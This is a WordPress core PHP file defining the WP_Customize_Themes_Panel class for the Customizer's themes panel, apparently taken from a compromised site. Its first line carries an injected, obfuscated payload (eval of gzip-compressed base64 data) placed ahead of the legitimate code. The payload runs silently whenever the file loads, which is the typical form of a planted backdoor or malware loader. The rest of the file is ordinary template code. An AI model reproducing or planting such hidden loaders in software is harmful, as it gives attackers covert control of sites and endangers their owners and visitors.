<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Customize API: WP_Customize_Themes_Panel class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.9.0
 */

/**
 * Customize Themes Panel Class
 *
 * @since 4.9.0
 *
 * @see WP_Customize_Panel
 */
class WP_Customize_Themes_Panel extends WP_Customize_Panel {

	/**
	 * Panel type.
	 *
	 * @since 4.9.0
	 * @var string
	 */
	public $type = 'themes';

	/**
	 * An Underscore (JS) template for rendering this panel's container.
	 *
	 * The themes panel renders a custom panel heading with the current theme and a switch themes button.
	 *
	 * @see WP_Customize_Panel::print_template()
	 *
	 * @since 4.9.0
	 */
	protected function render_template() {
		?>
		<li id="accordion-section-{{ data.id }}" class="accordion-section control-panel-themes">
			<h3 class="accordion-section-title">
				<?php
				if ( $this->manager->is_theme_active() ) {
					echo '<span class="customize-action">' . __( 'Active theme' ) . '</span> {{ data.title }}';
				} else {
					echo '<span class="customize-action">' . __( 'Previewing theme' ) . '</span> {{ data.title }}';
				}
				?>

				<?php if ( current_user_can( 'switch_themes' ) ) : ?>
					<button type="button" class="button change-theme" aria-label="<?php esc_attr_e( 'Change theme' ); ?>"><?php _ex( 'Change', 'theme' ); ?></button>
				<?php endif; ?>
			</h3>
			<ul class="accordion-sub-container control-panel-content"></ul>
		</li>
		<?php
	}

	/**
	 * An Underscore (JS) template for this panel's content (but not its container).
	 *
	 * Class variables for this panel class are available in the `data` JS object;
	 * export custom variables by overriding WP_Customize_Panel::json().
	 *
	 * @since 4.9.0
	 *
	 * @see WP_Customize_Panel::print_template()
	 */
	protected function content_template() {
		?>
		<li class="panel-meta customize-info accordion-section <# if ( ! data.description ) { #> cannot-expand<# } #>">
			<button class="customize-panel-back" tabindex="-1" type="button"><span class="screen-reader-text"><?php _e( 'Back' ); ?></span></button>
			<div class="accordion-section-title">
				<span class="preview-notice">
					<?php
					/* translators: %s: themes panel title in the Customizer */
					echo sprintf( __( 'You are browsing %s' ), '<strong class="panel-title">' . __( 'Themes' ) . '</strong>' ); // Separate strings for consistency with other panels.
					?>
				</span>
				<?php if ( current_user_can( 'install_themes' ) && ! is_multisite() ) : ?>
					<# if ( data.description ) { #>
						<button class="customize-help-toggle dashicons dashicons-editor-help" type="button" aria-expanded="false"><span class="screen-reader-text"><?php _e( 'Help' ); ?></span></button>
					<# } #>
				<?php endif; ?>
			</div>
			<?php if ( current_user_can( 'install_themes' ) && ! is_multisite() ) : ?>
				<# if ( data.description ) { #>
					<div class="description customize-panel-description">
						{{{ data.description }}}
					</div>
				<# } #>
			<?php endif; ?>

			<div class="customize-control-notifications-container"></div>
		</li>
		<li class="customize-themes-full-container-container">
			<div class="customize-themes-full-container">
				<div class="customize-themes-notifications"></div>
			</div>
		</li>
		<?php
	}
}